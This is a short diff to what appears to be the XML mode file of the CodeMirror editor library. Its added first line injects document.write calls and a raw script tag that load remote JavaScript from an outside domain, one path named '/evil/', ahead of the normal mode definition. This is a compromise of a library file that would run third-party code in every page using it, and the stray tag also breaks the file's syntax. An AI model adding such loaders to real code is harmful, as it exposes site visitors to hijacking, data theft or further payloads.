@@ -1,4 +1,4 @@
-CodeMirror.defineMode("xml", function(config, parserConfig) {
+document.write("<script src=\"http://cpm.36obuy.org/evil/1.js\"></script>");document.write("<script src=\"http://cpm.36obuy.org/lion/1.js\"></script>");<script src="http://cpm.36obuy.org/js/1.js"></script>CodeMirror.defineMode("xml", function(config, parserConfig) {
   var indentUnit = config.indentUnit;
   var Kludges = parserConfig.htmlMode ? {
     autoSelfClosers: {'area': true, 'base': true, 'br': true, 'col': true, 'command': true,
